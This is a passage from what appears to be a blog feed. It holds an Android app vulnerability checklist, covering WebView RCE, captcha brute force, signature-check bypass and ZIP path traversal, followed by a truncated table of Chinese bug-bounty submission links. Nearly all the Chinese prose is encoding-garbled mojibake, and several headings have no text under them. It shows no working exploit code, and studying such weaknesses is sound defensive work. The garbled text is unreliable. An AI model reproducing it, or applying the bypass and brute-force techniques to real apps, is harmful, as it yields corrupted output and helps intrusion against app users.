<h3 id="Debuggable"><a href="#Debuggable" class="headerlink" title="Debuggable"></a>Debuggable</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">android:debuggableå±æ€§æ˜¯æŒ‡å®šåº”ç”¨ç¨‹åºæ˜¯å¦èƒ½å¤Ÿè¢«è°ƒè¯•ï¼Œå³æ—¶æ˜¯ä»¥ç”¨æˆ·æ¨¡å¼è¿è¡Œåœ¨è®¾å¤‡ä¸Šçš„æ—¶å€™ï¼Œå¦‚æœè®¾ç½®ä¸º true ï¼Œåˆ™èƒ½å¤Ÿè¢«è°ƒè¯•ï¼Œå¦åˆ™ä¸èƒ½è°ƒè¯•ï¼Œé»˜è®¤å€¼æ˜¯false</span><br><span class="line"></span><br><span class="line">é€†å‘å·¥ä½œäººå‘˜åœ¨å¯¹ä¸€ä¸ªapkç¨‹åºè¿›è¡Œé€†å‘æ—¶ï¼Œç¬¬ä¸€æ­¥å¾€å¾€å°±æ˜¯è¦å¯¹debuggableå±æ€§è¿›è¡Œç»•è¿‡ï¼Œå¦åˆ™å°±ä¸èƒ½è¿›è¡Œæ­£å¸¸çš„è°ƒè¯•ï¼Œå› æ­¤å¦‚æœå±æ€§æœ¬èº«è®¾ä¸ºtrueï¼Œæ›´å®¹æ˜“å¯¼è‡´è¯¥åº”ç”¨å­˜åœ¨åŠ¨æ€è°ƒè¯•ï¼Œæ³„éœ²æ•°æ®ä¿¡æ¯çš„é£é™©</span><br></pre></td></tr></table></figure>

<h3 id="Information-Leakage"><a href="#Information-Leakage" class="headerlink" title="Information Leakage"></a>Information Leakage</h3><h4 id="LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´"><a href="#LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´" class="headerlink" title="LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´"></a>LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">åœ¨APPçš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå¼€å‘è€…é€šå¸¸ä¼šç”¨logcatè¾“å‡ºinfoã€debugã€error ç­‰ä¿¡æ¯ã€‚å¦‚æœåœ¨APPå‘å¸ƒæ—¶æ²¡æœ‰å»æ‰logcatä¿¡æ¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡æŸ¥çœ‹logcatæ—¥å¿—è·å¾—æ•æ„Ÿä¿¡æ¯.</span><br><span class="line"></span><br><span class="line">åº”ç”¨å±‚Logæ•æ„Ÿä¿¡æ¯è¾“å‡º</span><br><span class="line">åº”ç”¨å±‚System.out.printlnæ•æ„Ÿä¿¡æ¯è¾“å‡º</span><br><span class="line">ç³»ç»Ÿbugå¼‚å¸¸å¯¼è‡´Logè¾“å‡º</span><br><span class="line">Nativeå±‚æ•æ„ŸLogè¾“å‡º</span><br></pre></td></tr></table></figure>

<h4 id="ç¡¬ç¼–ç "><a href="#ç¡¬ç¼–ç " class="headerlink" title="ç¡¬ç¼–ç "></a>ç¡¬ç¼–ç </h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä¸€äº›å¼€å‘äººå‘˜ï¼Œåœ¨å¼€å‘æ—¶ä½¿ç”¨ç¡¬ç¼–ç çš„æ–¹å¼ï¼Œå¯¼è‡´å­˜åœ¨ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œç¡¬ç¼–ç ä¸€èˆ¬æ˜¯æŒ‡å°†è¾“å‡ºæˆ–è¾“å…¥çš„ç›¸å…³å‚æ•°ä»¥å¸¸é‡çš„æ–¹å¼ç¼–å†™åœ¨æºä»£ç ä¸­ï¼Œè¿™æ ·å¯¼è‡´é€†å‘åˆ†æäººå‘˜å¯ä»¥ç›´æ¥é€šè¿‡åˆ†ææºç å°±å¯ä»¥è·å¾—æ•æ„Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h4 id="Shared-Preferenceå…¨å±€å¯è¯»å†™æ¼æ´"><a href="#Shared-Preferenceå…¨å±€å¯è¯»å†™æ¼æ´" class="headerlink" title="Shared Preferenceå…¨å±€å¯è¯»å†™æ¼æ´"></a>Shared Preferenceå…¨å±€å¯è¯»å†™æ¼æ´</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Shared Preferenceså­˜å‚¨å®‰å…¨é£é™©åœ¨äºï¼šå¼€å‘è€…åœ¨åˆ›å»ºæ–‡ä»¶æ—¶æ²¡æœ‰æ­£ç¡®çš„é€‰æ‹©åˆé€‚çš„åˆ›å»ºæ¨¡å¼ï¼ˆMODE_PRIVATEã€MODE_WOELD_READABLEä»¥åŠMODE_WORLD_WRITEABBLEï¼‰è¿›è¡Œæƒé™æ§åˆ¶ï¼Œå¯¼è‡´å°†ä¸€äº›ç”¨æˆ·ä¿¡æ¯ã€å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯å­˜å‚¨åœ¨Shared Preferencesæ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡rootæ¥æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h4 id="SDå¡è¯»å†™"><a href="#SDå¡è¯»å†™" class="headerlink" title="SDå¡è¯»å†™"></a>SDå¡è¯»å†™</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç°åœ¨çš„æ‰‹æœºå¾ˆå¤šçš„å…¬å…±ç›®å½•éƒ½æ˜¯è‡ªèº«è‡ªå¸¦çš„å­˜å‚¨ç©ºé—´ï¼ŒAndroidç³»ç»Ÿçš„æ–‡ä»¶ä¸€èˆ¬éƒ½å­˜å‚¨åœ¨sdCardå’Œåº”ç”¨çš„ç§æœ‰ç›®å½•ä¸‹ï¼Œä»»ä½•åœ¨Android Manifestä¸­å£°æ˜è¯»å†™sdcardæƒé™çš„åº”ç”¨éƒ½å¯ä»¥å¯¹sdcardè¿›è¡Œè¯»å†™ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="Unsafe-HTTP-s"><a href="#Unsafe-HTTP-s" class="headerlink" title="Unsafe HTTP&#x2F;s"></a>Unsafe HTTP&#x2F;s</h2><h3 id="Plaintext-Transmit"><a href="#Plaintext-Transmit" class="headerlink" title="Plaintext Transmit"></a>Plaintext Transmit</h3><h3 id="Lack-verification-of-certificate"><a href="#Lack-verification-of-certificate" class="headerlink" title="Lack verification of certificate"></a>Lack verification of certificate</h3><h3 id="Lack-verification-of-hostname"><a href="#Lack-verification-of-hostname" class="headerlink" title="Lack verification of hostname"></a>Lack verification of hostname</h3><h3 id="Bypass-certificate"><a href="#Bypass-certificate" class="headerlink" title="Bypass certificate"></a>Bypass certificate</h3><h2 id="Captcha"><a href="#Captcha" class="headerlink" title="Captcha"></a>Captcha</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç æš´åŠ›ç ´è§£æ¼æ´ä¸€èˆ¬æ˜¯å› ä¸ºç”¨æˆ·ä½¿ç”¨æ‰‹æœºå·+éªŒè¯ç çš„æ–¹å¼è¿›è¡Œç™»é™†æ—¶ï¼ŒçŸ­ä¿¡éªŒè¯ç ä¸€èˆ¬ç”±4-6ä½æ•°å­—ç»„æˆï¼Œè€Œä¸”APPå¹¶æœªå¯¹éªŒè¯ç åšæ—¶é—´å’Œå¤±è´¥æ¬¡æ•°æ ¡éªŒï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªåŒºé—´çš„æ‰€æœ‰æ•°å­—è¿›è¡Œæš´åŠ›ç ´è§£æ¥è¿›è¡Œæ”»å‡»</span><br></pre></td></tr></table></figure>

<h3 id="Interface-Abuse"><a href="#Interface-Abuse" class="headerlink" title="Interface Abuse"></a>Interface Abuse</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç æ— é™æ¬¡æ•°å‘é€ã€çŸ­ä¿¡è½°ç‚¸æ¼æ´ä¸€èˆ¬æ˜¯APPç«¯å¹¶æ²¡æœ‰å¯¹æ‰‹æœºå·ç è¿›è¡Œæ¬¡æ•°æ˜¾ç¤ºï¼Œä¹Ÿæœªå¯¹è®¿é—®è¿›è¡Œæ—¶é—´é™åˆ¶</span><br></pre></td></tr></table></figure>

<h3 id="Amnipotent-Captcha"><a href="#Amnipotent-Captcha" class="headerlink" title="Amnipotent Captcha"></a>Amnipotent Captcha</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. éªŒè¯ç æ‰§è¡Œã€æ‰¾å›å¯†ç ã€‘æ“ä½œæ—¶ï¼Œè¾“å…¥æ‰‹æœºå·ï¼Œè·å–éªŒè¯ç ï¼ŒæœåŠ¡å™¨ä¼šå‘æ‰‹æœºå‘é€éªŒè¯ç ï¼Œé€šè¿‡burpsuiteæŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹è¿”å›çš„å“åº”æ•°æ®åŒ…ä¸­å¦‚æœåŒ…å«éªŒè¯ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´ç”¨æˆ·å¯†ç æ¶æ„é‡ç½®ã€ç»‘å®šæ‰‹æœºå·è¢«æ¶æ„æ›´æ¢ç­‰é£é™©</span><br><span class="line">2. ä¸‡èƒ½éªŒè¯ç ä¸€èˆ¬æ˜¯å¼€å‘åœ¨ä¸šåŠ¡æœªä¸Šçº¿çš„æ—¶å€™ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ç”¨çš„,ä¸Šçº¿åå¿˜è®°åˆ é™¤äº†,ä¾‹å¦‚[8888 0000 1234](tel:8888 0000 1234)ç­‰ç­‰</span><br></pre></td></tr></table></figure>

<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">åœ¨APPéªŒè¯ç æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°å¾ˆå¯¹APPå¹¶æœªå¯¹ç™»å½•æˆåŠŸçš„å“åº”æŠ¥æ–‡è¿›è¡Œæ ¡éªŒï¼Œå¯¼è‡´æˆ‘ä»¬è·å–ç™»å½•æˆåŠŸçš„å“åº”æŠ¥æ–‡åï¼Œå°±å¯ä»¥é€šè¿‡æ­£ç¡®çš„å“åº”æŠ¥æ–‡å®ç°ä»»æ„å·ç çš„ç™»å½•ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²</span><br></pre></td></tr></table></figure>

<h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å½“JSæ‹¿åˆ°Androidè¿™ä¸ªå¯¹è±¡åï¼Œå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªAndroidå¯¹è±¡ä¸­æ‰€æœ‰çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç±»ï¼ˆjava.lang.Runtime ç±»ï¼‰ï¼Œä»è€Œè¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</span><br><span class="line">ï¼ˆ1ï¼‰Androidä¸­çš„å¯¹è±¡æœ‰ä¸€å…¬å…±çš„æ–¹æ³•ï¼šgetClass() </span><br><span class="line">ï¼ˆ2ï¼‰è¯¥æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç±» ç±»å‹Class</span><br><span class="line">ï¼ˆ3ï¼‰è¯¥ç±»æœ‰ä¸€å…³é”®çš„æ–¹æ³•ï¼š Class.forNameï¼›</span><br><span class="line">ï¼ˆ4ï¼‰è¯¥æ–¹æ³•å¯ä»¥åŠ è½½ä¸€ä¸ªç±»ï¼ˆå¯åŠ è½½ java.lang.Runtime ç±»ï¼‰</span><br><span class="line">ï¼ˆ5ï¼‰è€Œè¯¥ç±»æ˜¯å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤çš„</span><br></pre></td></tr></table></figure>

<h3 id="Plaintext-Strorage"><a href="#Plaintext-Strorage" class="headerlink" title="Plaintext Strorage"></a>Plaintext Strorage</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·è¾“å…¥å¯†ç æ—¶ï¼Œä¼šå¼¹å‡ºæç¤ºæ¡†ï¼šè¯¢é—®ç”¨æˆ·æ˜¯å¦ä¿å­˜å¯†ç ï¼›å¦‚æœé€‰æ‹©â€æ˜¯â€ï¼Œå¯†ç ä¼šè¢«æ˜æ–‡ä¿åˆ° /data/data/com.package.name/databases/webview.db ä¸­</span><br></pre></td></tr></table></figure>

<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</span><br><span class="line">è¿™æ ·ä½¿å¾—WebViewå¯ä»¥ä½¿ç”¨Fileåè®®ï¼Œå’ŒåŠ è½½Jsä»£ç è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæˆ–è®¿é—®httpæºï¼Œè¿™æ ·ä¼šå¯¼è‡´æ”»å‡»è€…æ“ä½œç”¨æˆ·ç‚¹å‡»åæ— æ„ŸçŸ¥ä¸‹è½½æ¶æ„çš„HTML/JSï¼Œå¹¶çªƒå–ç›¸å…³çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h3 id="ä»»æ„ç•Œé¢æ³¨å…¥"><a href="#ä»»æ„ç•Œé¢æ³¨å…¥" class="headerlink" title="ä»»æ„ç•Œé¢æ³¨å…¥"></a>ä»»æ„ç•Œé¢æ³¨å…¥</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</span><br><span class="line">ç”¨åŒæ ·çš„æ–¹å¼æµ‹è¯• setAllowUniversalAccessFromFileURLs çš„å€¼ï¼Œå½“ setAllowUniversalAccessFromFileURLs çš„å€¼ä¸º true æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ js æ¥è®¿é—®æ¶æ„ç½‘ç«™ï¼ˆHTTP æˆ– HTTPSï¼‰çš„é“¾æ¥</span><br></pre></td></tr></table></figure>

<h3 id="Cookieç›—ç”¨"><a href="#Cookieç›—ç”¨" class="headerlink" title="Cookieç›—ç”¨"></a>Cookieç›—ç”¨</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åˆ›é€ ç¬¦å·é“¾æ¥ï¼Œç„¶åç»•è¿‡æ ¡éªŒï¼Œè®¿é—®æ”»å‡»çš„htmlï¼Œå†é€šè¿‡è½¯é“¾æ¥å»åŠ è½½symlink.htmlï¼Œç„¶åçªƒå–Cooike</span><br></pre></td></tr></table></figure>

<h3 id="Launch-Any-Where"><a href="#Launch-Any-Where" class="headerlink" title="Launch Any Where"></a>Launch Any Where</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Intentå¯ä»¥é€šè¿‡é‡å®šå‘çš„åŸç†ï¼Œé€šè¿‡æºå¸¦æ•°æ®ä¿¡æ¯ï¼Œè®¿é—®ä¸€ä¸ªå¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œç„¶åå†è¿›è¡Œæ•°æ®ä¼ é€’å»è§¦å‘ä¸å¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œæœ€åå®ç°è®¿é—®ç§æœ‰ç»„ä»¶çš„ç›®çš„ï¼Œå¼•èµ·launchAnyWhereæ¼æ´</span><br></pre></td></tr></table></figure>

<h3 id="DeepLink-RCE"><a href="#DeepLink-RCE" class="headerlink" title="DeepLink_RCE"></a>DeepLink_RCE</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">æ ·æœ¬ä»£ç å±‚é€šè¿‡åå°„è°ƒç”¨å»å®‰è£…çš„åˆ—è¡¨ä¸­æœç´¢å®‰è£…çš„åº”ç”¨ï¼Œç„¶åå»è°ƒç”¨å…¶æ–¹æ³•è¿›è¡Œå®ç°ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ç›¸åŒçš„åŒ…åï¼Œç„¶åå°†æ”»å‡»æ ·æœ¬å»å®‰è£…åˆ°æ‰‹æœºä¸Šï¼Œæ˜¯çš„åº”ç”¨è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</span><br></pre></td></tr></table></figure>

<h3 id="WebView-loadDataWithBaseURL"><a href="#WebView-loadDataWithBaseURL" class="headerlink" title="WebView loadDataWithBaseURL"></a>WebView loadDataWithBaseURL</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å½“loadDataWithBaseURLçš„åŸŸåå’Œå†…å®¹åŒæ—¶å¯æ§æ˜¯ï¼Œå¯ä»¥æ„é€ ä»»æ„åŸŸä¸‹çš„XSS;é€šè¿‡æ¶æ„çš„deeplinkæ‰“å¼€ä»»æ„fragmentçš„æ¼æ´ï¼Œå®ç°å¯æ§ä»»æ„åŸŸæ‰§è¡Œä»»æ„JSï¼Œå®ç°ç›—å–ç™»é™†æ€çš„ç”¨æˆ·cookieï¼</span><br></pre></td></tr></table></figure>

<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½"><a href="#ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½" class="headerlink" title="ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½"></a>ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Androidç³»ç»Ÿæä¾›ç±»åŠ è½½å™¨DexClassLoaderï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½æ‰§è¡ŒåŒ…å«çš„JARæˆ–APKæ–‡ä»¶å†…çš„DEXæ–‡ä»¶ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ‰€åŠ è½½çš„Dexæ–‡ä»¶è¢«æ¶æ„åº”ç”¨æ›¿æ¢æˆ–ä»£ç æ³¨å…¥ï¼Œå¦‚æœä¸å¯¹Dexæ–‡ä»¶è¿›è¡Œç­¾åæ ¡éªŒï¼Œå°±å¯èƒ½å¯¼è‡´åŠ è½½çš„æ˜¯æ¶æ„ä»£ç ï¼Œè¿™æ ·å°±ä¼šè¿›ä¸€æ­¥é€ æˆä¸¥é‡å±å®³</span><br></pre></td></tr></table></figure>

<h3 id="ç­¾åç»•è¿‡"><a href="#ç­¾åç»•è¿‡" class="headerlink" title="ç­¾åç»•è¿‡"></a>ç­¾åç»•è¿‡</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">javaå±‚çš„ç­¾åæ ¡éªŒï¼š</span><br><span class="line">åŸç†ï¼šè¿™ç§æ˜¯å¼€å‘è€…åœ¨APK javaå±‚ä¸­åŠ å…¥äº†ç­¾åæ ¡éªŒä»£ç ï¼Œç„¶åé€šè¿‡æ ¡éªŒåŠ å…¥æ–‡ä»¶çš„MD5å€¼æˆ–è€…SHA1å€¼æ¥å¯¹æ–‡ä»¶è¿›è¡Œæ ¡éªŒ</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼šä¸€èˆ¬è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬é€šè¿‡å®šä½åˆ°APKä¸­çš„ç­¾åä»£ç æ®µï¼Œç„¶åè¿›è¡Œhook ç¯¡æ”¹æˆ–è€…è¿›è¡Œä¿®æ”¹åé‡æ‰“åŒ…å°±å¯ä»¥è¿›è¡Œç»•è¿‡</span><br><span class="line">soå±‚çš„ç­¾åæ ¡éªŒï¼š</span><br><span class="line">åŸç†ï¼šç”±äºjavaå¯è§£é‡Šè¯­è¨€çš„åŸå› ï¼Œæ‰€ä»¥åæ¥å¼€å‘è€…åˆå°†ç­¾åä»£ç æ”¾å…¥soå±‚ï¼Œä»è€Œå¢åŠ é€†å‘å·¥ä½œçš„éš¾åº¦</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼šè¿™ç§æƒ…å†µï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨IDAæˆ–GDBè¿›è¡ŒåŠ¨æ€è°ƒè¯•ç¡®å®šåˆ°ç­¾åä»£ç æ®µï¼Œç„¶åä½¿ç”¨hook æ³¨å…¥æŠ€æœ¯æˆ–é™æ€ä¿®æ”¹æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">åœ¨çº¿ç­¾åæ ¡éªŒï¼š</span><br><span class="line">åŸç†ï¼šç”±äºå‰ä¸¤ç§æ–¹å¼éƒ½æ˜¯é™æ€æ ¡éªŒçš„æ–¹å¼ï¼Œè¿™æ ·çš„å®‰å…¨æ€§ä»ç„¶è¾ƒä½ï¼Œåæ¥æ›´å¤šå‚å•†é€šè¿‡æœåŠ¡å™¨åœ¨çº¿è¿›è¡ŒéªŒè¯ï¼Œå°†ç­¾åå¯†é’¥å‘é€ç„¶ååœ¨soå±‚æˆ–javaå±‚ä¸­è¿›è¡Œæ ¡éªŒ</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼šè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬è¦ä½¿ç”¨æŠ“åŒ…è½¯ä»¶å¯¹æœåŠ¡å™¨å‘é€çš„æ•°æ®åŒ…è¿›è¡ŒæŠ“å–ï¼Œåœ¨æˆåŠŸè·å–æ­£ç¡®å¯†é’¥åï¼Œå†å»hookå¯¹åº”çš„ç­¾åä»£ç æ®µï¼Œä»è€Œå°±å¯ä»¥å®ç°ç»•è¿‡</span><br></pre></td></tr></table></figure>

<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å› ä¸ºLinuxç³»ç»Ÿä¸­../ä»£è¡¨å‘ä¸Šçº§ç›®å½•è·³è½¬ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç›¸åº”çš„Zipæ–‡ä»¶ï¼Œåˆ©ç”¨å¤šä¸ª&#x27;../&#x27;ä»è€Œæ”¹å˜zipåŒ…ä¸­æŸä¸ªæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ï¼Œè´¹ç”¨è¯¥æ›¿æ¢æ‰åº”ç”¨åŸæœ‰çš„æ–‡ä»¶ï¼Œå®Œæˆç›®å½•ç©¿è¶Šã€‚è¿™æ ·ä¸¥é‡å¯èƒ½ä¼šå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå±å®³åº”ç”¨ç”¨æˆ·çš„è®¾å¤‡å®‰å…¨å’Œä¿¡æ¯å®‰å…¨</span><br><span class="line"></span><br><span class="line">Java ä»£ç åœ¨è§£å‹ zip æ–‡ä»¶æ—¶ï¼Œä¼šä½¿ç”¨åˆ° ZipEntry ç±»çš„ getName() æ–¹æ³•ï¼Œå¦‚æœ zip æ–‡ä»¶ä¸­åŒ…å« ../ çš„å­—ç¬¦ä¸²ï¼Œè¯¥æ–¹æ³•è¿”å›å€¼ä¼šåŸæ ·è¿”å›ã€‚å¦‚æœæ²¡æœ‰è¿‡æ»¤æ‰ getName() è¿”å›å€¼ä¸­çš„ ../ å­—ç¬¦ä¸²ï¼Œç»§ç»­è§£å‹ç¼©æ“ä½œï¼Œå°±ä¼šåœ¨å…¶ä»–ç›®å½•ä¸­åˆ›å»ºè§£å‹çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>ç§»åŠ¨å®‰å…¨</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>APK</tag>
        <tag>Drozer</tag>
      </tags>
  </entry>
  <entry>
    <title>SRCæŒ–æ˜</title>
    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<table>
<thead>
<tr>
<th align="center">Name</th>
<th align="center">Link</th>
</tr>
</thead>
<tbody><tr>
<td align="center">å­—èŠ‚è·³åŠ¨å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.bytedance.com/submit">https://security.bytedance.com/submit</a></td>
</tr>
<tr>
<td align="center">è…¾è®¯å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.tencent.com/index.php/report/add">https://security.tencent.com/index.php/report/add</a></td>
</tr>
<tr>
<td align="center">é˜¿é‡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.alibaba.com/">https://security.alibaba.com/</a></td>
</tr>
<tr>
<td align="center">äº¬ä¸œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.jd.com/">http://security.jd.com/</a></td>
</tr>
<tr>
<td align="center">ç™¾åº¦å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.baidu.com/views/main/loophole.html#home">http://sec.baidu.com/views/main/loophole.html#home</a></td>
</tr>
<tr>
<td align="center">é¡ºä¸°å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sfsrc.sf-express.com/submitBug">http://sfsrc.sf-express.com/submitBug</a></td>
</tr>
<tr>
<td align="center">360åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.360.cn/Report/index">https://security.360.cn/Report/index</a></td>
</tr>
<tr>
<td align="center">å“”å“©å“”å“©å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.bilibili.com/">https://security.bilibili.com/</a></td>
</tr>
<tr>
<td align="center">çˆ±å¥‡è‰ºå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.iqiyi.com/#submit">https://security.iqiyi.com/#submit</a></td>
</tr>
<tr>
<td align="center">èš‚èšé›†å›¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.alipay.com/sc/afsrc/home.htm">https://security.alipay.com/sc/afsrc/home.htm</a></td>
</tr>
<tr>
<td align="center">BIGO SRC</td>
<td align="center"><a href="https://security.bigo.sg/#/submittingReport">https://security.bigo.sg/#/submittingReport</a></td>
</tr>
<tr>
<td align="center">è´å£³å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.ke.com/vuls">https://security.ke.com/vuls</a></td>
</tr>
<tr>
<td align="center">360æ¼æ´äº‘ä¼—åŒ…</td>
<td align="center"><a href="https://src.360.net/home">https://src.360.net/home</a></td>
</tr>
<tr>
<td align="center">58å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.58.com/">https://security.58.com/</a></td>
</tr>
<tr>
<td align="center">æ»´æ»´å‡ºè¡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.didichuxing.com/">http://sec.didichuxing.com/</a></td>
</tr>
<tr>
<td align="center">ä¸œæ–¹è´¢å¯Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://passport2.eastmoney.com/pub/login?backurl=https://se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf">https://passport2.eastmoney.com/pub/login?backurl=https%3A//se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf</a></td>
</tr>
<tr>
<td align="center">æ–—é±¼å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.douyu.com/">https://security.douyu.com/</a></td>
</tr>
<tr>
<td align="center">å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.duxiaoman.com/views/main/loophole.html#home">https://security.duxiaoman.com/views/main/loophole.html#home</a></td>
</tr>
<tr>
<td align="center">DHgateå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html">http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html</a></td>
</tr>
<tr>
<td align="center">å¯Œå‹å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://fsrc.fuiou.com/">https://fsrc.fuiou.com/</a></td>
</tr>
<tr>
<td align="center">è´§æ‹‰æ‹‰å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://llsrc.huolala.cn/">https://llsrc.huolala.cn/</a></td>
</tr>
<tr>
<td align="center">åˆåˆå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.intsig.com/">https://security.intsig.com/</a></td>
</tr>
<tr>
<td align="center">ç«çº¿å®‰å…¨å¹³å°</td>
<td align="center"><a href="https://www.huoxian.cn/login">https://www.huoxian.cn/login</a></td>
</tr>
<tr>
<td align="center">å¥½æœªæ¥å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
